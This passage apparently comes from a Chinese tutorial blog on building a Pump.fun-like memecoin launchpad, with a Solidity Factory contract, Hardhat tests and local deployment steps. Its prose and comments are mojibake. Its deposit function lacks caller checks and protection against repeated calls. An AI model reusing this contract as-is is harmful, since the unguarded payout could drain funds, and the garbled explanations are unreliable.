class="line">    require(sale.isOpen == false,&quot;Factory: Target not reached&quot;);</span><br><span class="line"></span><br><span class="line">    //å°†Factoryåˆçº¦æŒæœ‰çš„ä»£å¸è½¬ç§»ç»™creator</span><br><span class="line">    token.transfer(sale.creator, token.balanceOf(address(this)));</span><br><span class="line"></span><br><span class="line">    //å°†ç­¹é›†çš„ETHå…¨éƒ¨è½¬ç§»creator</span><br><span class="line">    (bool success,) = payable(sale.creator).call&#123;value: sale.raised&#125;(&quot;&quot;);</span><br><span class="line">    require(success,&quot;Factory: ETH transfer failed&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¥å‡½æ•°æ˜¯<code>external</code>çš„ï¼Œåªèƒ½ä»åˆçº¦çš„å¤–éƒ¨è°ƒç”¨ï¼Œå…¶ä¸»è¦åŠŸèƒ½ä¸º<code>token</code>é”€å”®ç»“æŸåçš„èµ„é‡‘ç»“ç®—ã€‚</p><p>å‡½æ•°ä¼ å…¥çš„å‚æ•°ä¸º<code>_token</code>ï¼Œå³<code>token</code>çš„åœ°å€ã€‚åˆ©ç”¨<code>token</code>çš„åœ°å€è·å–åˆ°<code>token</code>çš„é”€å”®ä¿¡æ¯ï¼Œåªæœ‰å½“<code>token</code>è¾¾åˆ°é”€å”®çš„é¢„æœŸåæ‰è¿›è¡Œèµ„é‡‘çš„æ¸…ç®—ï¼Œå³ä»£ç ä¸­çš„<code>sale.isOpen == false</code>ã€‚ç„¶åå°†<code>factory</code>åˆçº¦æŒæœ‰çš„<code>token</code>å…¨éƒ¨è½¬ç»™<code>creator</code>ã€‚æœ€åå†æŠŠ<code>factory</code>ç­¹é›†çš„<code>ETH</code>ä¹Ÿå…¨éƒ¨è½¬ç»™<code>creator</code>ã€‚</p><h4 id="åˆçº¦æµ‹è¯•-3">åˆçº¦æµ‹è¯•</h4><p>jsä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">describe</span>(<span class="string">&quot;Depositing&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">AMOUNT</span> = ethers.<span class="title function_">parseUnits</span>(<span class="string">&quot;10000&quot;</span>, <span class="number">18</span>);</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">COST</span> = ethers.<span class="title function_">parseUnits</span>(<span class="string">&quot;2&quot;</span>, <span class="number">18</span>);</span><br><span class="line">    <span class="title function_">it</span>(<span class="string">&quot;Sale should be closed and successful deposits&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">const</span> &#123; factory, token, creator, buyer&#125; = <span class="keyword">await</span> <span class="title function_">loadFixture</span>(buyTokenFixture);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Buy tokens again to reach the target</span></span><br><span class="line">        <span class="keyword">const</span> buyTx = <span class="keyword">await</span> factory.<span class="title function_">connect</span>(buyer).<span class="title function_">buy</span>(<span class="keyword">await</span> token.<span class="title function_">getAddress</span>(), <span class="variable constant_">AMOUNT</span>, &#123;<span class="attr">value</span>: <span class="variable constant_">COST</span>&#125;);</span><br><span class="line">        <span class="keyword">await</span> buyTx.<span class="title function_">wait</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> sale = <span class="keyword">await</span> factory.<span class="title function_">tokenToSale</span>(<span class="keyword">await</span> token.<span class="title function_">getAddress</span>());</span><br><span class="line">        <span class="title function_">expect</span>(sale.<span class="property">isOpen</span>).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> depositTx = <span class="keyword">await</span> factory.<span class="title function_">connect</span>(creator).<span class="title function_">deposit</span>(<span class="keyword">await</span> token.<span class="title function_">getAddress</span>());</span><br><span class="line">        <span class="keyword">await</span> depositTx.<span class="title function_">wait</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> balance = <span class="keyword">await</span> token.<span class="title function_">balanceOf</span>(creator.<span class="property">address</span>);</span><br><span class="line">        <span class="comment">//console.log(balance);</span></span><br><span class="line">        <span class="title function_">expect</span>(balance).<span class="property">to</span>.<span class="title function_">equal</span>(ethers.<span class="title function_">parseUnits</span>(<span class="string">&quot;980000&quot;</span>,<span class="number">18</span>));</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>å¯¹äºå­˜æ¬¾é€»è¾‘æµ‹è¯•ï¼š</p><p>ï¼ˆ1ï¼‰è°ƒç”¨<code>loadFixture(buyTokenFixture);</code>å‡½æ•°è·å–ç›¸å…³ç”¨æˆ·å’Œ<code>token</code>ã€‚æ³¨æ„è¿™é‡Œæ˜¯è°ƒç”¨äº†<code>buyTokenFixture</code>ï¼Œåœ¨<code>buyTokenFixture</code>å‡½æ•°ä¸­<code>buyer</code>å·²ç»è´­ä¹°äº†<code>10000 ether</code>çš„<code>token</code>ï¼Œå¹¶å‘<code>factory</code>åˆçº¦ä¸­è½¬å…¥äº†<code>1 ether</code>ã€‚</p><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250217130455947.png" alt="image-20250217130455947"></p><p>ï¼ˆ2ï¼‰åœ¨æ­¤<code>Depositing</code>æµ‹è¯•ä¸­<code>buyer</code>åˆå†æ¬¡è´­ä¹°äº†<code>10000 ether</code>çš„<code>token</code>ï¼Œå¹¶å‘åˆçº¦ä¸­è½¬å…¥äº†<code>2 ether</code>ã€‚</p><p>ï¼ˆ3ï¼‰æ£€æŸ¥<code>token</code>çš„é”€å”®ä¿¡æ¯ã€‚å› ä¸ºå…ˆåå‘<code>factory</code>åˆçº¦ä¸­ä¸€å…±è½¬å…¥äº†<code>3 ether</code>ï¼Œè¾¾åˆ°äº†ç›®æ ‡ï¼Œ<code>sale.isOpen</code>è¢«èµ‹å€¼äº†<code>false</code>ã€‚æ‰€ä»¥æµ‹è¯•ä¸­ï¼Œ<code>sale.isOpen</code>æ˜¯ä¸º<code>false</code>çš„ã€‚</p><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250217131220117.png" alt="image-20250217131220117"></p><p>ï¼ˆ4ï¼‰è¾¾åˆ°<code>token</code>çš„å”®å–ç›®æ ‡åï¼Œå°†<code>factory</code>å‰©ä½™çš„<code>token</code>å…¨éƒ¨è½¬ç§»ä¸º<code>creator</code>ã€‚å› ä¸ºä¸€å…±è´­ä¹°äº†<code>20000 ether</code>ï¼Œä¸€å…±é“¸é€ äº†<code>1000000 ether</code>çš„<code>token</code>ï¼Œæ•…è½¬ç§»ç»™<code>creator</code>çš„<code>token</code>çš„æ•°é‡åº”è¯¥ä¸º<code>980000 ether</code>ã€‚æ‰€ä»¥æµ‹è¯•ä¸­<code>creator</code>çš„<code>token</code>æ•°é‡ä¸º<code>980000 ether</code>ã€‚</p><h3 id="Withdrawå‡½æ•°-åˆçº¦èµ„é‡‘å›æ’¤">Withdrawå‡½æ•°(åˆçº¦èµ„é‡‘å›æ’¤)</h3><h4 id="å‡½æ•°ä»£ç -4">å‡½æ•°ä»£ç </h4><p>ä»£ç è¯¦ç»†å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function withdraw(uint256 _amount) external&#123;</span><br><span class="line">    require(msg.sender == owner, &quot;Factory: Not Owner&quot;);</span><br><span class="line"></span><br><span class="line">    (bool success, ) = payable(owner).call&#123;value: _amount&#125;(&quot;&quot;);</span><br><span class="line">    require(success, &quot;Factory: ETH transfer failed&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¥åˆçº¦å‡½æ•°ä¼ å…¥çš„å‚æ•°ä¸º<code>_amount</code>ï¼Œå³è¦è½¬ç§»çš„èµ„é‡‘æ•°é‡ï¼Œå…¶åŠŸèƒ½æ˜¯å°†ä¸€å®šæ•°é‡çš„åˆçº¦èµ„é‡‘è½¬ç»™åˆçº¦çš„æ‹¥æœ‰è€…<code>owner</code>ã€‚</p><p>é¦–å…ˆï¼Œåˆ¤æ–­<code>msg.sender</code>æ˜¯å¦ä¸º<code>owner</code>ï¼Œå³è°ƒç”¨<code>withdraw</code>åˆçº¦å‡½æ•°çš„åœ°å€æ˜¯å¦ä¸º<code>owner</code>ã€‚åªæœ‰åˆçº¦çš„<code>owner</code>æ‰èƒ½ç®¡ç†åˆçº¦ä¸­çš„èµ„é‡‘ã€‚è¯¥å‡½æ•°çš„ç¬¬ä¸€æ­¥å³éªŒè¯æƒé™ï¼Œç¡®å®šè¦ä¸º<code>owner</code>ã€‚ç¡®è®¤<code>owner</code>çš„èº«ä»½åï¼Œè°ƒç”¨è½¬è´¦å‡½æ•°ï¼Œå°†åˆçº¦çš„<code>_amount</code>æ•°é‡çš„èµ„é‡‘è½¬ç§»ç»™<code>owner</code>ã€‚</p><h4 id="åˆçº¦æµ‹è¯•-4">åˆçº¦æµ‹è¯•</h4><p>jsä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">describe</span>(<span class="string">&quot;Withdrawing Fee&quot;</span>, <span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">//éƒ¨ç½²åˆçº¦ï¼Œæäº¤äº†FEE</span></span><br><span class="line">    <span class="comment">//ç„¶åå†å°†FEEè¿›è¡Œæ’¤å›</span></span><br><span class="line">    <span class="title function_">it</span>(<span class="string">&quot;Should update ETH balances&quot;</span>, <span class="keyword">async</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">const</span> &#123; factory, deployer&#125; = <span class="keyword">await</span> <span class="title function_">loadFixture</span>(deployFactoryFixture);</span><br><span class="line">        <span class="keyword">const</span> transaction = <span class="keyword">await</span> factory.<span class="title function_">connect</span>(deployer).<span class="title function_">withdraw</span>(<span class="variable constant_">FEE</span>);</span><br><span class="line">        <span class="keyword">await</span> transaction.<span class="title function_">wait</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> balance = <span class="keyword">await</span> ethers.<span class="property">provider</span>.<span class="title function_">getBalance</span>(<span class="keyword">await</span> factory.<span class="title function_">getAddress</span>());</span><br><span class="line"></span><br><span class="line">        <span class="title function_">expect</span>(balance).<span class="property">to</span>.<span class="title function_">equal</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>åˆçº¦èµ„é‡‘å›æ’¤æµ‹è¯•ï¼š</p><p>ï¼ˆ1ï¼‰é¦–å…ˆï¼Œ<code>deployer</code>è°ƒç”¨<code>loadFixture(deployFactoryFixture)</code>å‡½æ•°è¿›è¡Œ<code>factory</code>åˆçº¦çš„éƒ¨ç½²ï¼Œåˆçº¦éƒ¨ç½²æ—¶ï¼Œä¼šåˆ›å»ºç¬¬ä¸€ä¸ª<code>token</code>ï¼Œå¹¶è½¬å…¥åˆ›å»ºçš„<code>FEE</code>ã€‚æ­¤æ—¶<code>factory</code>åˆçº¦çš„<code>owner</code>ä¸º<code>deployer</code>ï¼Œ<code>factory</code>åˆçº¦çš„èµ„é‡‘æ•°ä¸º<code>FEE</code>ã€‚</p><p>ï¼ˆ2ï¼‰<code>deployer</code>è°ƒç”¨<code>factory</code>åˆçº¦çš„<code>withdraw</code>å‡½æ•°è¿›è¡Œåˆçº¦èµ„é‡‘çš„å›æ’¤ã€‚</p><p>ï¼ˆ3ï¼‰æœ€åæµ‹è¯•ï¼Œå›æ’¤èµ„é‡‘æˆåŠŸåï¼Œ<code>factory</code>åˆçº¦çš„èµ„é‡‘å˜ä¸º0ã€‚</p><h3 id="å®Œæ•´åˆçº¦ä»£ç ">å®Œæ•´åˆçº¦ä»£ç </h3><p>å®Œæ•´çš„<code>Factory.sol</code>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity 0.8.27;</span><br><span class="line"></span><br><span class="line">import &#123;Token&#125; from &quot;./Token.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Factory &#123;</span><br><span class="line">    uint256 public constant TARGET = 3 ether;</span><br><span class="line">    uint256 public constant TOKEN_LIMIT = 500_000 ether;</span><br><span class="line">    //äº¤æ˜“è´¹è´¹ç”¨</span><br><span class="line">    uint256 public immutable fee;</span><br><span class="line">    //åˆçº¦çš„éƒ¨ç½²è€…</span><br><span class="line">    address public owner;</span><br><span class="line">    //tokenæ•°ç»„</span><br><span class="line">    address[] public tokens;</span><br><span class="line">    //tokenæ€»å…±çš„æ•°é‡</span><br><span class="line">    uint256 public totalTokens;</span><br><span class="line"></span><br><span class="line">    //å°†tokençš„åœ°å€æ˜ å°„åˆ°tokenå”®å–ä¿¡æ¯çš„ç»“æ„ä½“ä¸Š</span><br><span class="line">    mapping(address =&gt; TokenSale) public tokenToSale;</span><br><span class="line">    //åˆ›å»ºä¸€ä¸ªå”®å–tokençš„ç»“æ„ä½“</span><br><span class="line">    struct TokenSale&#123;</span><br><span class="line">        address token;</span><br><span class="line">        string name;</span><br><span class="line">        address creator;</span><br><span class="line">        uint256 sold;</span><br><span class="line">        uint256 raised;</span><br><span class="line">        bool isOpen;</span><br><span class="line">    &#125;</span><br><span class="line">    //å½“åˆ›å»ºä¸€ä¸ªtokenæ—¶ï¼Œå‘ç”Ÿäº†ä¸€ä¸ªCreatedäº‹ä»¶</span><br><span class="line">    event Created(address indexed token);</span><br><span class="line">    //å½“è´­ä¹°ä¸€ä¸ªtokenæ—¶ï¼Œå‘ç”Ÿä¸€ä¸ªBuyäº‹ä»¶</span><br><span class="line">    event Buy(address indexed token, uint256 amount);</span><br><span class="line"></span><br><span class="line">    constructor(uint256 _fee) &#123;</span><br><span class="line">        fee = _fee;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //é€šè¿‡tokenåœ¨tokenæ•°ç»„ä¸­çš„ä¸‹æ ‡_indexï¼Œæ¥è·å–tokençš„å”®å–ä¿¡æ¯</span><br><span class="line">    function getTokenSale(uint256 _index) public view returns (TokenSale memory) &#123;</span><br><span class="line">        return tokenToSale[tokens[_index]];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getCost(uint256 _sold) public pure returns (uint256)&#123;</span><br><span class="line">        uint256 floor = 0.0001 ether;</span><br><span class="line">        uint256 step = 0.0001 ether;</span><br><span class="line">        uint256 increment = 10000 ether;</span><br><span class="line">        uint256 cost = (step * (_sold / increment)) + floor;</span><br><span class="line">        return cost;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function create(string memory _name, string memory _symbol) external payable &#123;</span><br><span class="line">        //ç¡®ä¿åˆ›å»ºè€…çš„ä½™é¢å¤§äºfeeï¼Œå¦åˆ™æŠ¥é”™ä¸å‘ä¸‹ç»§ç»­æ‰§è¡Œã€‚</span><br><span class="line">        require(msg.value &gt;= fee, &quot;Factory: Creator fee not met&quot;);</span><br><span class="line">        </span><br><span class="line">        //åˆ›å»ºä¸€ä¸ªtoken</span><br><span class="line">        Token token = new Token(msg.sender, _name, _symbol, 1000000 ether);</span><br><span class="line">        //tokensæ•°ç»„å­˜å‚¨token</span><br><span class="line">        tokens.push(address(token));</span><br><span class="line">        //tokenè®¡æ•°</span><br><span class="line">        totalTokens ++;</span><br><span class="line">        //åˆ—å‡ºç”¨äºå”®å–çš„token</span><br><span class="line">        // address token;</span><br><span class="line">        // string name;</span><br><span class="line">        // address creator;</span><br><span class="line">        // uint256 sold;</span><br><span class="line">        // uint256 raised;</span><br><span class="line">        // bool isOpen;</span><br><span class="line">        TokenSale memory sale = TokenSale(address(token),_name,msg.sender,0,0,true);</span><br><span class="line"></span><br><span class="line">        tokenToSale[address(token)] = sale;</span><br><span class="line">        //è§¦å‘Createdäº‹ä»¶ï¼Œé€šçŸ¥tokenè¢«åˆ›å»ºäº†ã€‚</span><br><span class="line">        emit Created(address(token));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function buy(address _token, uint256 _amount) external payable&#123;</span><br><span class="line">        TokenSale storage sale = tokenToSale[_token];</span><br><span class="line">        //æ£€æŸ¥æ¡ä»¶</span><br><span class="line">        require(sale.isOpen == true, &quot;Factory: Buying closed&quot;);</span><br><span class="line">        require(_amount &gt;= 1 ether, &quot;Factory: Amount too low&quot;);</span><br><span class="line">        require(_amount &lt;= 10000 ether, &quot;Factory: Amount exceeded&quot;);</span><br><span class="line"></span><br><span class="line">        //è®¡ç®—ä¸€ä¸ªtokençš„ä»·æ ¼åŸºäºè´­ä¹°çš„æ€»é‡</span><br><span class="line">        uint256 cost = getCost(sale.sold);</span><br><span class="line">        uint256 price = cost * (_amount / 10 ** 18);</span><br><span class="line">        //ç¡®ä¿è¶³å¤Ÿçš„ETHå‘é€</span><br><span class="line">        require(msg.value &gt;= price, &quot;Factory: Insufficient ETH received&quot;);</span><br><span class="line">        //æ›´æ–°sale</span><br><span class="line">        sale.sold += _amount;</span><br><span class="line">        sale.raised += price;</span><br><span class="line">        //åˆ¤æ–­ç­¹é›†ç›®æ ‡æ˜¯å¦è¾¾æˆ</span><br><span class="line">        if(sale.sold &gt;= TOKEN_LIMIT || sale.raised &gt;= TARGET)&#123;</span><br><span class="line">            //å…³é—­é”€å”®</span><br><span class="line">            sale.isOpen = false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Token(_token).transfer(msg.sender, _amount);</span><br><span class="line">        //è§¦å‘Buyäº‹ä»¶</span><br><span class="line">        emit Buy(_token, _amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit(address _token) external&#123;</span><br><span class="line">        //ä»£å¸é”€å”®ç»“æŸåèµ„é‡‘ç»“ç®—çš„é€»è¾‘</span><br><span class="line"></span><br><span class="line">        //å‰©ä¸‹çš„tokenä½™é¢å’Œå¢åŠ çš„ETH</span><br><span class="line">        //ä¼šè¿›å…¥åƒuniswap v3é‚£æ ·çš„æµåŠ¨æ€§æ± </span><br><span class="line">        //ä¸ºäº†ç®€å•èµ·è§ï¼Œæˆ‘ä»¬åªè½¬ç§»å‰©ä½™çš„éƒ¨åˆ†</span><br><span class="line">        //å‰©ä½™çš„tokens å’Œ ETHè½¬ç»™creator</span><br><span class="line">        Token token = Token(_token);</span><br><span class="line">        TokenSale memory sale = tokenToSale[_token];</span><br><span class="line"></span><br><span class="line">        require(sale.isOpen == false,&quot;Factory: Target not reached&quot;);</span><br><span class="line"></span><br><span class="line">        //å°†Factoryåˆçº¦æŒæœ‰çš„ä»£å¸è½¬ç§»ç»™creator</span><br><span class="line">        token.transfer(sale.creator, token.balanceOf(address(this)));</span><br><span class="line"></span><br><span class="line">        //å°†ç­¹é›†çš„ETHå…¨éƒ¨è½¬ç§»creator</span><br><span class="line">        (bool success,) = payable(sale.creator).call&#123;value: sale.raised&#125;(&quot;&quot;);</span><br><span class="line">        require(success,&quot;Factory: ETH transfer failed&quot;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw(uint256 _amount) external&#123;</span><br><span class="line">        require(msg.sender == owner, &quot;Factory: Not Owner&quot;);</span><br><span class="line">        </span><br><span class="line">        (bool success, ) = payable(owner).call&#123;value: _amount&#125;(&quot;&quot;);</span><br><span class="line">        require(success, &quot;Factory: ETH transfer failed&quot;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æœ¬åœ°éƒ¨ç½²åˆçº¦">æœ¬åœ°éƒ¨ç½²åˆçº¦</h2><p>åœ¨<code>/FUN-PUMP/ignition/modules/</code>ç›®å½•ä¸‹ï¼Œåˆ›å»º<code>Factory.js</code>ï¼Œè¿›è¡Œåˆçº¦çš„éƒ¨ç½²ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; buildModule &#125; = <span class="built_in">require</span>(<span class="string">&quot;@nomicfoundation/hardhat-ignition/modules&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; ethers &#125; = <span class="built_in">require</span>(<span class="string">&quot;hardhat&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">FEE</span> = ethers.<span class="title function_">parseUnits</span>(<span class="string">&quot;0.01&quot;</span>, <span class="number">18</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="title function_">buildModule</span>(<span class="string">&quot;FactoryModule&quot;</span>, <span class="function">(<span class="params">m</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> fee = m.<span class="title function_">getParameter</span>(<span class="string">&quot;fee&quot;</span>, <span class="variable constant_">FEE</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">const</span> factory = m.<span class="title function_">contract</span>(<span class="string">&quot;Factory&quot;</span>, [fee]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123; factory &#125;;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>é¦–å…ˆå¯åŠ¨æœ¬åœ°çš„åŒºå—é“¾ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx hardhat node</span><br></pre></td></tr></table></figure><p>ç„¶åï¼Œè¿›è¡Œåˆçº¦éƒ¨ç½²</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx hardhat ignition deploy ignition/modules/Factory.js --network localhost</span><br></pre></td></tr></table></figure><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250217145430869.png" alt="image-20250217145430869"></p><p>æˆåŠŸéƒ¨ç½²ã€‚</p><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250217145456776.png" alt="image-20250217145456776"></p><p>å¦‚æœå·²ç»éƒ¨ç½²äº†åˆçº¦ï¼Œéœ€è¦é‡ç½®åˆçº¦</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx hardhat ignition deploy ignition/modules/Factory.js --network localhost --reset</span><br></pre></td></tr></table></figure><h2 id="å‰ç«¯">å‰ç«¯</h2><p>æœ¬åœ°æµ‹è¯•ï¼Œä½¿ç”¨<code>next.js</code>æ¸²æŸ“å‰ç«¯çš„ç•Œé¢ï¼Œå‰ç«¯ä½¿ç”¨<code>React</code>åº“ç”¨ä½œå‰ç«¯ç•Œé¢å±•ç¤ºã€‚å‰ç«¯æ‰§è¡Œ<code>javascript</code>å’Œéƒ¨ç½²åœ¨åŒºå—é“¾ä¸Šçš„<code>factory</code>åˆçº¦è¿›è¡Œäº¤äº’ï¼Œè¿”å›ç»“æœï¼Œå‰ç«¯è¿›è¡Œå±•ç¤ºã€‚</p><p>å¯åŠ¨<code>next.js</code>ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run dev</span><br></pre></td></tr></table></figure><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250217150831503.png" alt="image-20250217150831503"></p><h3 id="Metamaskå¯¼å…¥æœ¬åœ°ç”¨æˆ·">Metamaskå¯¼å…¥æœ¬åœ°ç”¨æˆ·</h3><p>ç‚¹å‡»æ·»åŠ è´¦æˆ·ï¼Œå¯¼å…¥è´¦æˆ·ã€‚</p><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250217154415563.png" alt="image-20250217154415563"></p><p>æœ¬åœ°åŒºå—é“¾å¯åŠ¨æ—¶ï¼Œä¼šæœ‰å‡ ä¸ªæµ‹è¯•è´¦æˆ·ï¼Œå¯¼å…¥ç§é’¥å³å¯ã€‚</p><p><img src="/2025/02/06/%E5%81%9A%E4%B8%AA%E5%83%8FPump-fun%E4%B8%80%E6%A0%B7%E7%9A%84Memecoin%E5%90%AF%E5%8A%A8%E5%8F%B0/image-20250217154636893.png" alt="image-20250217154636893"></p><h3 id="è¿æ¥é’±åŒ…å¹¶åŠ è½½é“¾ä¸Šå†…å®¹">è¿æ¥é’±åŒ…å¹¶åŠ è½½é“¾ä¸Šå†…å®¹</h3><p>é¦–å…ˆå°†éƒ¨ç½²åˆçº¦åçš„åˆçº¦åœ°å€æ·»åŠ 